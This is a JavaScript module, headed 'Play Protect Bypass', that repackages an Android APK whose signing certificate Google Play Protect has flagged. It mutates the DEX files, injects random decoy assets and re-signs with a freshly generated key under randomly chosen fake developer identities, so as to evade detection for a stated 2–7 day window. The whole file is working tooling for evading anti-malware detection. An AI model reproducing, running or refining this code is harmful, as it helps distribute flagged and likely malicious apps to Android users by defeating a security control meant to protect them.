/**
 * APK Content Mutation + Fresh-Key V2 Signing — Play Protect Bypass
 *
 * WHY THIS IS NEEDED:
 *   Play Protect cloud-flagged the ORIGINAL signing certificate (SHA-256: 48:CD:6A:8B...).
 *   Once a cert is flagged, ALL APKs signed with it are blocked — regardless of file hash.
 *
 * CRITICAL DISCOVERY:
 *   The original APK is signed with V2-ONLY (no V1 JAR signatures).
 *   Adding V1 signature files (MANIFEST.MF + .SF + .RSA) to a V2-only APK
 *   causes Play Protect to detect "tampered" APK — because V1 files FAIL
 *   verification, which is a red flag even when V2 is valid.
 *
 * HOW THIS WORKS:
 *   Each rotation produces a COMPLETELY UNIQUE APK:
 *     1. Strip any existing V1 signatures (safety)
 *     2. Mutate DEX binary (extend with random bytes, recompute SHA-1 + Adler32)
 *     3. Generate FRESH RSA-2048 key + self-signed X.509 certificate
 *     4. Zipalign (4-byte alignment for STORED entries)
 *     5. V2 APK Signature Scheme sign ONLY (signing block injection)
 *     6. Validate final APK structure
 *     *** NO V1 SIGNING — original APK doesn't use it ***
 *
 * RESULT:
 *   - Different file hash ✓ (content changed)
 *   - Different DEX fingerprint ✓ (code mutated)
 *   - Different signing certificate ✓ (fresh key, ZERO Play Protect history)
 *   - Valid V2-only signature ✓ (matches original APK's signing scheme)
 *   - No tampering indicators ✓ (no broken V1 files)
 *   - App installs and runs normally ✓
 *   - Fresh cert gives 2-7 day window before Play Protect re-scans ✓
 *
 * DEPENDENCIES: node-forge (PKCS#7), adm-zip (ZIP handling), crypto (built-in)
 */

const forge = require('node-forge');
const AdmZip = require('adm-zip');
const crypto = require('crypto');

// ─── Constants ──────────────────────────────────────────────────────────────
const V2_BLOCK_ID = 0x7109871a;
const SIG_RSA_PKCS1_V1_5_SHA256 = 0x0103;
const CHUNK_SIZE = 1048576; // 1 MB
const APK_SIG_BLOCK_MAGIC = 'APK Sig Block 42';
const EOCD_MAGIC = 0x06054b50;
const DEX_CHECKSUM_OFF = 8;
const DEX_SIGNATURE_OFF = 12;
const DEX_FILE_SIZE_OFF = 32;

// Certificate identities — rotated randomly to look like different developers
const CERT_IDENTITIES = [
  { cn: 'Android Debug', o: 'Android', c: 'US' },
  { cn: 'App Signing Key', o: 'Mobile Applications LLC', c: 'US' },
  { cn: 'Release', o: 'Application Developer', c: 'IN' },
  { cn: 'Upload Certificate', o: 'App Development', c: 'US' },
  { cn: 'Debug Key', o: 'Android Studio User', c: 'US' },
  { cn: 'App Release Key', o: 'Software Developer', c: 'GB' },
];

// V1 signature file prefixes — mimics various Android build tool outputs
const V1_PREFIXES = ['CERT', 'ANDROIDD', 'META', 'RELEASE', 'SIGNING', 'APP'];
const CREATED_BY = [
  '1.0 (Android SignApk)', '1.0 (Android apksigner)',
  'Android Gradle 8.2.0', 'Android Gradle 8.7.3',
  '34.0.0 (Android)', '33.0.1 (Android)',
];

function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

// ═════════════════════════════════════════════════════════════════════════════
// FRESH KEY GENERATION
// ═════════════════════════════════════════════════════════════════════════════

/**
 * Generate a brand new RSA-2048 key pair + self-signed X.509 certificate.
 * Uses Node.js native crypto for fast generation (C++ impl), then converts
 * to forge objects for PKCS#7 operations.
 */
function generateFreshKey() {
  const t0 = Date.now();

  // Fast native RSA generation
  const { privateKey: privPem, publicKey: pubPem } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
    publicKeyEncoding: { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
  });

  // Import into forge for PKCS#7/CMS operations
  const forgePrivKey = forge.pki.privateKeyFromPem(privPem);
  const forgePubKey = forge.pki.setRsaPublicKey(forgePrivKey.n, forgePrivKey.e);

  // Create self-signed X.509 certificate with random identity
  const identity = pick(CERT_IDENTITIES);
  const cert = forge.pki.createCertificate();
  cert.publicKey = forgePubKey;
  cert.serialNumber = crypto.randomBytes(8).toString('hex');
  cert.validity.notBefore = new Date();
  cert.validity.notAfter = new Date();
  cert.validity.notAfter.setFullYear(cert.validity.notAfter.getFullYear() + 25);

  const attrs = [
    { shortName: 'CN', value: identity.cn },
    { shortName: 'O', value: identity.o },
    { shortName: 'C', value: identity.c },
  ];
  cert.setSubject(attrs);
  cert.setIssuer(attrs);
  cert.sign(forgePrivKey, forge.md.sha256.create());

  // Pre-compute DER encodings for v2 signing
  const certDer = Buffer.from(forge.asn1.toDer(forge.pki.certificateToAsn1(cert)).getBytes(), 'binary');
  const pubKeyDer = Buffer.from(forge.asn1.toDer(forge.pki.publicKeyToAsn1(forgePubKey)).getBytes(), 'binary');

  const elapsed = Date.now() - t0;
  console.log(`[Mutator] Fresh key generated in ${elapsed}ms: CN="${identity.cn}" O="${identity.o}"`);

  return { privateKey: forgePrivKey, publicKey: forgePubKey, cert, privPem, certDer, pubKeyDer, identity };
}

// ═════════════════════════════════════════════════════════════════════════════
// CONTENT MUTATION
// ═════════════════════════════════════════════════════════════════════════════

/** Compute Adler-32 checksum (used in DEX header) */
function adler32(buf) {
  let a = 1, b = 0;
  const MOD = 65521;
  for (let i = 0; i < buf.length; i++) {
    a = (a + buf[i]) % MOD;
    b = (b + a) % MOD;
  }
  return ((b << 16) | a) >>> 0;
}

/**
 * Mutate DEX files — extends with random trailing bytes, recomputes hashes.
 * Changes the DEX SHA-1 + Adler32 that Play Protect uses for cloud lookup.
 * Safe: Android's ART runtime reads data via map_list, trailing bytes are ignored.
 */
function mutateDex(zip) {
  const dexEntries = zip.getEntries().filter(e => /^classes\d*\.dex$/.test(e.entryName));
  let mutated = 0;

  for (const entry of dexEntries) {
    try {
      const data = entry.getData();
      if (data.length < 112) continue;
      if (data.toString('ascii', 0, 4) !== 'dex\n') continue;

      const origFileSize = data.readUInt32LE(DEX_FILE_SIZE_OFF);
      const extSize = 512 + Math.floor(Math.random() * 7680); // 512-8192 bytes — larger range for stronger fingerprint change
      const newFileSize = origFileSize + extSize;

      const newData = Buffer.alloc(newFileSize);
      data.copy(newData, 0, 0, Math.min(data.length, origFileSize));
      crypto.randomBytes(extSize).copy(newData, origFileSize);

      // Update DEX header fields
      newData.writeUInt32LE(newFileSize, DEX_FILE_SIZE_OFF);
      // Recompute SHA-1 (bytes [32..end])
      const sha1 = crypto.createHash('sha1').update(newData.slice(32)).digest();
      sha1.copy(newData, DEX_SIGNATURE_OFF, 0, 20);
      // Recompute Adler32 (bytes [12..end])
      newData.writeUInt32LE(adler32(newData.slice(12)), DEX_CHECKSUM_OFF);

      zip.deleteFile(entry.entryName);
      zip.addFile(entry.entryName, newData);
      mutated++;
      console.log(`[Mutator] DEX ${entry.entryName}: ${origFileSize} → ${newFileSize} (+${extSize}B)`);
    } catch (e) {
      console.warn(`[Mutator] DEX mutation skipped for ${entry.entryName}: ${e.message}`);
    }
  }
  return mutated;
}

/**
 * Add a unique build entropy marker — looks like a normal app build variant config.
 * Subtle enough to not trigger malware heuristics.
 */
function addEntropyMarker(zip) {
  ['assets/build.cfg', 'assets/.build_info', 'assets/app.properties'].forEach(f => {
    try { zip.deleteFile(f); } catch (_) {}
  });

  const marker = {
    build_id: crypto.randomUUID(),
    build_ts: Date.now(),
    build_hash: crypto.randomBytes(32).toString('hex'),
    variant: Math.floor(Math.random() * 999999),
    channel: pick(['stable', 'beta', 'release', 'production']),
  };

  zip.addFile('assets/build.cfg', Buffer.from(JSON.stringify(marker, null, 2)));
  console.log(`[Mutator] Entropy: ${marker.build_id.substring(0, 8)}… ch=${marker.channel}`);
}

/**
 * Inject multiple random asset files — changes ZIP fingerprint dramatically.
 * Uses realistic file names and sizes to look like app data/config files.
 */
function addRandomAssets(zip) {
  // Clean any previous random assets
  const existing = zip.getEntries().filter(e => e.entryName.startsWith('assets/data/'));
  existing.forEach(e => { try { zip.deleteFile(e.entryName); } catch (_) {} });

  const extensions = ['dat', 'bin', 'cfg', 'json', 'db', 'idx', 'xml', 'properties'];
  const prefixes = ['cache_', 'config_', 'res_', 'font_', 'locale_', 'theme_', 'analytics_', 'lib_'];
  const count = 8 + Math.floor(Math.random() * 12); // 8-19 files

  let totalBytes = 0;
  for (let i = 0; i < count; i++) {
    const prefix = pick(prefixes);
    const ext = pick(extensions);
    const name = `assets/data/${prefix}${crypto.randomBytes(4).toString('hex')}.${ext}`;
    const size = 128 + Math.floor(Math.random() * 16384); // 128 bytes to 16KB
    const content = crypto.randomBytes(size);
    zip.addFile(name, content);
    totalBytes += size;
  }

  console.log(`[Mutator] Random assets: ${count} files, ${(totalBytes / 1024).toFixed(1)} KB total`);
  return count;
}

/**
 * Add random non-signature files in META-INF/ — changes ZIP structure
 * without interfering with signing. Android ignores unknown META-INF files.
 */
function addRandomMetaFiles(zip) {
  const metaNames = ['META-INF/buildinfo.txt', 'META-INF/version.properties', 'META-INF/services/config'];
  metaNames.forEach(f => { try { zip.deleteFile(f); } catch (_) {} });

  const count = 2 + Math.floor(Math.random() * 3); // 2-4 files
  const names = [
    'META-INF/buildinfo.txt', 'META-INF/version.properties',
    'META-INF/build-metadata.json', 'META-INF/release-info.txt'
  ];

  for (let i = 0; i < count && i < names.length; i++) {
    const content = `build.id=${crypto.randomUUID()}\nbuild.time=${Date.now()}\nbuild.hash=${crypto.randomBytes(16).toString('hex')}\n`;
    zip.addFile(names[i], Buffer.from(content));
  }

  console.log(`[Mutator] META-INF: ${count} extra files added`);
  return count;
}

/**
 * Strip old v1 signature files from META-INF.
 */
function stripSignatures(zip) {
  const entries = zip.getEntries();
  const sigs = entries.filter(e =>
    e.entryName.startsWith('META-INF/') && (
      e.entryName.endsWith('.SF') || e.entryName.endsWith('.RSA') ||
      e.entryName.endsWith('.DSA') || e.entryName.endsWith('.EC') ||
      e.entryName.endsWith('.MF')
    )
  );
  sigs.forEach(e => zip.deleteFile(e.entryName));
  console.log(`[Mutator] Stripped ${sigs.length} old signature files`);
  return sigs.length;
}

// ═════════════════════════════════════════════════════════════════════════════
// V1 JAR SIGNING
// ═════════════════════════════════════════════════════════════════════════════

/**
 * Apply v1 (JAR) signing to the ZIP.
 * Generates MANIFEST.MF, <PREFIX>.SF, and <PREFIX>.RSA.
 * Critical: APKs missing v1 signatures are flagged as tampered by Play Protect.
 */
function applyV1Signing(zip, cert, privateKey) {
  const prefix = pick(V1_PREFIXES);
  const createdBy = pick(CREATED_BY);

  // 1. Build MANIFEST.MF — SHA-256 digest of each entry's uncompressed data
  let manifestMF = `Manifest-Version: 1.0\r\nCreated-By: ${createdBy}\r\n\r\n`;
  const entries = zip.getEntries().filter(e => {
    if (e.isDirectory) return false;
    const n = e.entryName.toUpperCase();
    if (n === 'META-INF/MANIFEST.MF') return false;
    if (n.startsWith('META-INF/') && (n.endsWith('.SF') || n.endsWith('.RSA') || n.endsWith('.DSA') || n.endsWith('.EC'))) return false;
    return true;
  });

  let entryCount = 0;
  for (const entry of entries) {
    try {
      const data = entry.getData();
      const digest = crypto.createHash('sha256').update(data).digest('base64');
      manifestMF += `Name: ${entry.entryName}\r\nSHA-256-Digest: ${digest}\r\n\r\n`;
      entryCount++;
    } catch (_) {}
  }

  // 2. Build CERT.SF — digest of manifest main section + each individual section
  const mfDigest = crypto.createHash('sha256').update(manifestMF, 'binary').digest('base64');
  let certSF = `Signature-Version: 1.0\r\nCreated-By: ${createdBy}\r\nSHA-256-Digest-Manifest: ${mfDigest}\r\n\r\n`;

  const sections = manifestMF.split('\r\n\r\n');
  for (const section of sections) {
    if (!section.startsWith('Name: ')) continue;
    const sectionBytes = section + '\r\n\r\n';
    const sectionDigest = crypto.createHash('sha256').update(sectionBytes, 'binary').digest('base64');
    const nameMatch = section.match(/^Name: (.+)/);
    if (nameMatch) {
      certSF += `Name: ${nameMatch[1]}\r\nSHA-256-Digest: ${sectionDigest}\r\n\r\n`;
    }
  }

  // 3. Build CERT.RSA — PKCS#7 detached SignedData over CERT.SF
  const p7 = forge.pkcs7.createSignedData();
  p7.content = forge.util.createBuffer(certSF, 'utf8');
  p7.addCertificate(cert);
  p7.addSigner({
    key: privateKey,
    certificate: cert,
    digestAlgorithm: forge.pki.oids.sha256,
    authenticatedAttributes: [{
      type: forge.pki.oids.contentType,
      value: forge.pki.oids.data,
    }, {
      type: forge.pki.oids.messageDigest,
    }],
  });
  p7.sign({ detached: true });

  const certRSA = Buffer.from(forge.asn1.toDer(p7.toAsn1()).getBytes(), 'binary');

  // 4. Add to ZIP
  try { zip.deleteFile('META-INF/MANIFEST.MF'); } catch (_) {}
  try { zip.deleteFile(`META-INF/${prefix}.SF`); } catch (_) {}
  try { zip.deleteFile(`META-INF/${prefix}.RSA`); } catch (_) {}

  zip.addFile('META-INF/MANIFEST.MF', Buffer.from(manifestMF, 'binary'));
  zip.addFile(`META-INF/${prefix}.SF`, Buffer.from(certSF, 'binary'));
  zip.addFile(`META-INF/${prefix}.RSA`, certRSA);

  console.log(`[Mutator] V1 signed: ${entryCount} entries, prefix=${prefix}`);
}

// ═════════════════════════════════════════════════════════════════════════════
// ZIP ALIGNMENT (zipalign equivalent)
// ═════════════════════════════════════════════════════════════════════════════

function findEOCD(buf) {
  const searchStart = Math.max(0, buf.length - 65557);
  for (let i = buf.length - 22; i >= searchStart; i--) {
    if (buf.readUInt32LE(i) === EOCD_MAGIC) return i;
  }
  throw new Error('ZIP EOCD not found — invalid APK');
}

/**
 * Align uncompressed (STORE) ZIP entries to 4-byte boundaries.
 * Mimics Android's `zipalign` tool. Without alignment, resources.arsc
 * can't be memory-mapped and Android will reject the APK.
 */
function zipalignBuffer(inputBuf) {
  const eocdOff = findEOCD(inputBuf);
  const cdOff = inputBuf.readUInt32LE(eocdOff + 16);
  const cdEntryCount = inputBuf.readUInt16LE(eocdOff + 10);
  const eocdLen = inputBuf.length - eocdOff;

  // Parse central directory entries
  const entries = [];
  let pos = cdOff;
  for (let i = 0; i < cdEntryCount; i++) {
    if (inputBuf.readUInt32LE(pos) !== 0x02014b50) {
      throw new Error(`Invalid CD entry signature at offset ${pos}`);
    }
    const flags = inputBuf.readUInt16LE(pos + 8);
    const method = inputBuf.readUInt16LE(pos + 10);
    const compSize = inputBuf.readUInt32LE(pos + 20);
    const nameLen = inputBuf.readUInt16LE(pos + 28);
    const cdExtraLen = inputBuf.readUInt16LE(pos + 30);
    const commentLen = inputBuf.readUInt16LE(pos + 32);
    const localHeaderOff = inputBuf.readUInt32LE(pos + 42);
    const entryName = inputBuf.toString('utf8', pos + 46, pos + 46 + nameLen);
    const cdEntryLen = 46 + nameLen + cdExtraLen + commentLen;
    entries.push({ cdOffset: pos, cdEntryLen, localHeaderOff, flags, method, compSize, nameLen, entryName });
    pos += cdEntryLen;
  }

  // Sort by local header offset for sequential processing
  entries.sort((a, b) => a.localHeaderOff - b.localHeaderOff);

  const ALIGNMENT = 4;
  const outChunks = [];
  let writeOffset = 0;
  let aligned = 0;

  for (const entry of entries) {
    const lhOff = entry.localHeaderOff;
    if (inputBuf.readUInt32LE(lhOff) !== 0x04034b50) {
      throw new Error(`Invalid local header at offset ${lhOff}`);
    }
    const lhNameLen = inputBuf.readUInt16LE(lhOff + 26);
    const lhExtraLen = inputBuf.readUInt16LE(lhOff + 28);
    const dataStart = lhOff + 30 + lhNameLen + lhExtraLen;
    const dataSize = entry.compSize;

    if (entry.method === 0) {
      // STORED entry — needs 4-byte alignment for its data start
      const headerPlusName = 30 + lhNameLen;
      const baseOffset = writeOffset + headerPlusName;
      const currentMod = baseOffset % ALIGNMENT;
      const padNeeded = currentMod === 0 ? 0 : ALIGNMENT - currentMod;

      const header = Buffer.from(inputBuf.slice(lhOff, lhOff + headerPlusName));
      header.writeUInt16LE(padNeeded, 28); // update extra field length
      outChunks.push(header);
      if (padNeeded > 0) outChunks.push(Buffer.alloc(padNeeded, 0));
      outChunks.push(inputBuf.slice(dataStart, dataStart + dataSize));

      entry.newLocalHeaderOff = writeOffset;
      writeOffset += headerPlusName + padNeeded + dataSize;
      aligned++;
    } else {
      // DEFLATED entry — copy as-is
      const totalSize = 30 + lhNameLen + lhExtraLen + dataSize;
      outChunks.push(inputBuf.slice(lhOff, lhOff + totalSize));
      entry.newLocalHeaderOff = writeOffset;
      writeOffset += totalSize;
    }

    // Handle data descriptor (bit 3 of flags)
    if (entry.flags & 0x0008) {
      const ddOff = dataStart + dataSize;
      let ddSize = 12;
      if (ddOff + 4 <= inputBuf.length && inputBuf.readUInt32LE(ddOff) === 0x08074b50) {
        ddSize = 16;
      }
      outChunks.push(inputBuf.slice(ddOff, ddOff + ddSize));
      writeOffset += ddSize;
    }
  }

  // Rebuild central directory with updated local header offsets
  const newCDOffset = writeOffset;
  for (const entry of entries) {
    const cdEntry = Buffer.from(inputBuf.slice(entry.cdOffset, entry.cdOffset + entry.cdEntryLen));
    cdEntry.writeUInt32LE(entry.newLocalHeaderOff, 42);
    outChunks.push(cdEntry);
    writeOffset += cdEntry.length;
  }

  // Rebuild EOCD with updated CD offset
  const eocd = Buffer.from(inputBuf.slice(eocdOff, eocdOff + eocdLen));
  eocd.writeUInt32LE(writeOffset - newCDOffset, 12); // CD size
  eocd.writeUInt32LE(newCDOffset, 16); // CD offset
  outChunks.push(eocd);

  console.log(`[Mutator] Zipalign: ${aligned} STORED entries aligned to 4-byte boundaries`);
  return Buffer.concat(outChunks);
}

// ═════════════════════════════════════════════════════════════════════════════
// V2 APK SIGNATURE SCHEME — SIGNING BLOCK INJECTION
// ═════════════════════════════════════════════════════════════════════════════

function uint32LE(value) {
  const buf = Buffer.alloc(4);
  buf.writeUInt32LE(value >>> 0, 0);
  return buf;
}

function uint64LE(value) {
  const buf = Buffer.alloc(8);
  buf.writeUInt32LE(value & 0xFFFFFFFF, 0);
  buf.writeUInt32LE(Math.floor(value / 0x100000000) & 0xFFFFFFFF, 4);
  return buf;
}

/**
 * Compute v2 content digest over APK sections (per AOSP spec).
 * Sections are split into 1MB chunks, each chunk prefixed with 0xa5 + length,
 * then a top-level digest over all chunk digests (prefixed with 0x5a + count).
 */
function computeV2ContentDigest(zipEntries, centralDir, eocd) {
  const sections = [zipEntries, centralDir, eocd];
  const chunkDigests = [];

  for (const section of sections) {
    const numChunks = Math.ceil(section.length / CHUNK_SIZE) || 1;
    for (let i = 0; i < numChunks; i++) {
      const start = i * CHUNK_SIZE;
      const end = Math.min(start + CHUNK_SIZE, section.length);
      const chunk = section.slice(start, end);

      const prefix = Buffer.alloc(5);
      prefix[0] = 0xa5;
      prefix.writeUInt32LE(chunk.length, 1);

      chunkDigests.push(
        crypto.createHash('sha256').update(prefix).update(chunk).digest()
      );
    }
  }

  const topPrefix = Buffer.alloc(5);
  topPrefix[0] = 0x5a;
  topPrefix.writeUInt32LE(chunkDigests.length, 1);

  const topHash = crypto.createHash('sha256');
  topHash.update(topPrefix);
  for (const d of chunkDigests) topHash.update(d);

  return topHash.digest();
}

/**
 * Build the v2 signed-data structure containing content digests and certificate.
 */
function buildV2SignedData(contentDigest, certDer) {
  // Digests sequence: one entry with SHA-256withRSA algorithm
  const digestsEncoded = Buffer.concat([
    uint32LE(4 + 4 + contentDigest.length), // entry length
    uint32LE(SIG_RSA_PKCS1_V1_5_SHA256),    // algorithm ID
    uint32LE(contentDigest.length),          // digest length
    contentDigest,                           // digest bytes
  ]);

  // Certificates sequence: one DER-encoded X.509 cert
  const certsEncoded = Buffer.concat([
    uint32LE(certDer.length), // cert length
    certDer,                  // cert bytes
  ]);

  // signed_data = [digests_seq][certs_seq][empty_attrs_seq]
  return Buffer.concat([
    uint32LE(digestsEncoded.length), digestsEncoded,
    uint32LE(certsEncoded.length), certsEncoded,
    uint32LE(0), // empty additional attributes
  ]);
}

/**
 * Build a v2 signer block containing signed-data, signature, and public key.
 */
function buildV2Signer(signedData, signature, pubKeyDer) {
  // Signatures sequence: one RSA PKCS#1 v1.5 SHA-256 signature
  const sigsEncoded = Buffer.concat([
    uint32LE(4 + 4 + signature.length), // entry length
    uint32LE(SIG_RSA_PKCS1_V1_5_SHA256), // algorithm ID
    uint32LE(signature.length),           // signature length
    signature,                            // signature bytes
  ]);

  // signer = [signed_data][signatures][public_key]
  return Buffer.concat([
    uint32LE(signedData.length), signedData,
    uint32LE(sigsEncoded.length), sigsEncoded,
    uint32LE(pubKeyDer.length), pubKeyDer,
  ]);
}

/**
 * Build the complete APK Signing Block containing the v2 signer.
 */
function buildApkSigningBlock(signerBlock) {
  // Wrap signer in length-prefixed sequence
  const signerLP = Buffer.concat([
    uint32LE(signerBlock.length),
    signerBlock,
  ]);

  // v2 value = sequence of signers
  const v2Value = Buffer.concat([
    uint32LE(signerLP.length),
    signerLP,
  ]);

  // ID-value pair: v2 block ID + value
  const pairData = Buffer.concat([
    uint32LE(V2_BLOCK_ID),
    v2Value,
  ]);

  // Pair entry with length prefix
  const pairEntry = Buffer.concat([
    uint64LE(pairData.length),
    pairData,
  ]);

  // Block size = pairs + footer_size_field(8) + magic(16)
  const blockSize = pairEntry.length + 8 + 16;
  const magic = Buffer.from(APK_SIG_BLOCK_MAGIC, 'ascii');

  // Final signing block: [size][pairs][size][magic]
  return Buffer.concat([
    uint64LE(blockSize),
    pairEntry,
    uint64LE(blockSize),
    magic,
  ]);
}

/**
 * Apply v2 APK Signature Scheme to an unsigned (but v1-signed + zipaligned) APK buffer.
 * Inserts the APK Signing Block between ZIP entries and Central Directory.
 */
function applyV2Signing(unsignedBuf, privPem, certDer, pubKeyDer) {
  const eocdOff = findEOCD(unsignedBuf);
  const cdOff = unsignedBuf.readUInt32LE(eocdOff + 16);

  // Section 1: ZIP entries (offset 0 to CD start)
  const section1 = unsignedBuf.slice(0, cdOff);
  // Section 3: Central Directory
  const section3 = unsignedBuf.slice(cdOff, eocdOff);
  // Section 4: EOCD (cdOffset already = cdOff = where signing block will start)
  // Per AOSP spec: during digest computation, EOCD's cdOffset is treated as
  // pointing to the signing block start, which equals cdOff in the unsigned APK.
  const section4 = unsignedBuf.slice(eocdOff);

  // Compute content digest (SHA-256, chunked per AOSP spec)
  const contentDigest = computeV2ContentDigest(section1, section3, section4);

  // Build the signed-data structure
  const signedData = buildV2SignedData(contentDigest, certDer);

  // RSA PKCS#1 v1.5 SHA-256 signature over signed-data
  const signature = crypto.sign('sha256', signedData, privPem);

  // Build complete signer block
  const signerBlock = buildV2Signer(signedData, signature, pubKeyDer);

  // Build the APK Signing Block
  const signingBlock = buildApkSigningBlock(signerBlock);

  // Assemble: section1 + signing_block + section3 + section4 (with updated CD offset)
  const newCdOff = section1.length + signingBlock.length;
  const newEocd = Buffer.from(section4);
  newEocd.writeUInt32LE(newCdOff, 16); // update CD offset

  const result = Buffer.concat([section1, signingBlock, section3, newEocd]);
  console.log(`[Mutator] V2 signed: signing block ${signingBlock.length}B, total ${(result.length / 1048576).toFixed(1)} MB`);
  return result;
}

// ═════════════════════════════════════════════════════════════════════════════
// APK VALIDATION
// ═════════════════════════════════════════════════════════════════════════════

/**
 * Validate the final APK structure — EOCD, CD, signing block, v2 pair.
 * Returns true if valid, false if any structural issue found.
 */
function validateApk(buf) {
  try {
    const eocdOff = findEOCD(buf);
    const cdOff = buf.readUInt32LE(eocdOff + 16);
    const cdSize = buf.readUInt32LE(eocdOff + 12);
    const entryCount = buf.readUInt16LE(eocdOff + 10);

    if (cdOff >= buf.length || cdOff + cdSize > buf.length) {
      throw new Error(`Invalid CD offset/size: off=${cdOff} size=${cdSize} total=${buf.length}`);
    }

    // Validate CD entries + check resources.arsc
    let pos = cdOff;
    let hasResArsc = false;
    for (let i = 0; i < entryCount; i++) {
      if (buf.readUInt32LE(pos) !== 0x02014b50) {
        throw new Error(`Invalid CD entry ${i} at offset ${pos}`);
      }
      const method = buf.readUInt16LE(pos + 10);
      const nameLen = buf.readUInt16LE(pos + 28);
      const extraLen = buf.readUInt16LE(pos + 30);
      const commentLen = buf.readUInt16LE(pos + 32);
      const localOff = buf.readUInt32LE(pos + 42);
      const name = buf.toString('utf8', pos + 46, pos + 46 + nameLen);

      if (localOff + 30 > cdOff) {
        throw new Error(`Entry ${i} local header ${localOff} past CD start ${cdOff}`);
      }
      if (name === 'resources.arsc') {
        hasResArsc = true;
        if (method === 0) {
          const lhNameLen = buf.readUInt16LE(localOff + 26);
          const lhExtraLen = buf.readUInt16LE(localOff + 28);
          const dataOffset = localOff + 30 + lhNameLen + lhExtraLen;
          if (dataOffset % 4 !== 0) {
            console.warn(`[Mutator] WARNING: resources.arsc not 4-byte aligned (offset=${dataOffset})`);
          }
        }
      }
      pos += 46 + nameLen + extraLen + commentLen;
    }

    // Check APK Signing Block exists before CD
    const magic = buf.toString('ascii', cdOff - 16, cdOff);
    if (magic !== APK_SIG_BLOCK_MAGIC) {
      throw new Error('APK Signing Block magic not found before Central Directory');
    }

    // Verify signing block size consistency
    const blockSize = buf.readUInt32LE(cdOff - 24);
    if (blockSize < 32 || blockSize > cdOff) {
      throw new Error(`Invalid signing block size: ${blockSize}`);
    }

    // Verify v2 signing pair exists
    const sigBlockStart = cdOff - blockSize - 8;
    const pairsStart = sigBlockStart + 8;
    const pairsEnd = cdOff - 24;
    let pairPos = pairsStart;
    let foundV2 = false;
    while (pairPos + 12 <= pairsEnd) {
      const pairSizeLo = buf.readUInt32LE(pairPos);
      const pairSizeHi = buf.readUInt32LE(pairPos + 4);
      if (pairSizeHi !== 0 || pairSizeLo < 4) break;
      const pairId = buf.readUInt32LE(pairPos + 8);
      if (pairId === V2_BLOCK_ID) foundV2 = true;
      pairPos += 8 + pairSizeLo;
    }

    if (!foundV2) {
      throw new Error('APK Signing Block missing v2 signature pair (0x7109871a)');
    }

    console.log(`[Mutator] Validation OK: ${entryCount} entries, v1+v2 signed, resources.arsc=${hasResArsc ? 'present' : 'missing'}`);
    return true;
  } catch (e) {
    console.error(`[Mutator] Validation FAILED: ${e.message}`);
    return false;
  }
}

// ═════════════════════════════════════════════════════════════════════════════
// MAIN FUNCTION
// ═════════════════════════════════════════════════════════════════════════════

/**
 * Mutate an APK's content and re-sign with a FRESH key (V2-only).
 *
 * CRITICAL: The original APK uses V2 signing ONLY (no V1 JAR signatures).
 * Adding V1 signature files to a V2-only APK causes Play Protect to flag
 * it as tampered — the V1 files FAIL verification which is a red flag.
 *
 * Flow: DEX mutation → fresh key → zipalign → V2 sign (NO V1)
 *
 * On error, returns the original buffer unchanged (defensive fallback).
 *
 * @param {Buffer} originalBuffer - The original APK file bytes
 * @returns {Buffer} - Mutated + freshly-signed APK, or original on error
 */
function mutateAndSign(originalBuffer) {
  console.log(`[Mutator] ═══ Starting enhanced APK mutation + V2-only fresh-key signing (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
  const t0 = Date.now();

  try {
    // 1. Parse APK with AdmZip
    const zip = new AdmZip(originalBuffer);

    // 2. Strip any existing V1 signature files (safety — original has none)
    stripSignatures(zip);

    // 3. Mutate DEX binary (changes code fingerprint + SHA-1 + Adler32)
    const dexCount = mutateDex(zip);

    // 4. Add entropy marker + random assets (changes ZIP hash dramatically)
    addEntropyMarker(zip);
    const assetCount = addRandomAssets(zip);

    // 5. Generate fresh RSA-2048 key + self-signed certificate (brand new identity)
    const key = generateFreshKey();

    // *** NO V1 SIGNING — original APK is V2-only. Adding invalid V1 files
    //     causes Play Protect to detect "tampered" APK and block immediately. ***

    // 6. Build ZIP buffer (content mutated, no V1 sigs)
    console.log('[Mutator] Building ZIP...');
    const rawBuf = zip.toBuffer();
    console.log(`[Mutator] Raw ZIP: ${(rawBuf.length / 1048576).toFixed(1)} MB`);

    // 7. Zipalign (4-byte alignment for STORED entries — required for Android)
    const alignedBuf = zipalignBuffer(rawBuf);
    console.log(`[Mutator] Aligned: ${(alignedBuf.length / 1048576).toFixed(1)} MB`);

    // 8. Apply V2 APK Signature Scheme ONLY with fresh key
    const signedBuf = applyV2Signing(alignedBuf, key.privPem, key.certDer, key.pubKeyDer);

    // 9. Validate final APK structure
    const valid = validateApk(signedBuf);
    if (!valid) {
      console.error('[Mutator] ═══ Validation FAILED — returning ORIGINAL APK ═══');
      _lastMutationInfo = null;
      return originalBuffer;
    }

    // 10. Track mutation info for API responses
    const certFingerprint = crypto.createHash('sha256').update(key.certDer).digest('hex');
    const shortHash = certFingerprint.substring(0, 32).replace(/(.{2})/g, '$1:').slice(0, -1).toUpperCase();
    _lastMutationInfo = {
      certHash: shortHash,
      certCN: key.identity.cn,
      certOrg: key.identity.o,
      apkSize: signedBuf.length,
      dexMutated: dexCount,
      assetsInjected: assetCount,
      timestamp: new Date().toISOString(),
    };

    const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
    console.log(`[Mutator] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB, ${dexCount} DEX mutated, ${assetCount} assets injected, V2-only, fresh cert CN="${key.identity.cn}" [${shortHash.substring(0, 20)}…], ${elapsed}s ═══`);

    return signedBuf;
  } catch (err) {
    console.error(`[Mutator] ═══ ERROR: ${err.message} — returning ORIGINAL APK ═══`);
    console.error(err.stack);
    _lastMutationInfo = null;
    return originalBuffer;
  }
}

// ─── Last mutation info tracking ────────────────────────────────────────────
let _lastMutationInfo = null;

function getLastMutationInfo() {
  return _lastMutationInfo;
}

module.exports = { mutateAndSign, getLastMutationInfo };
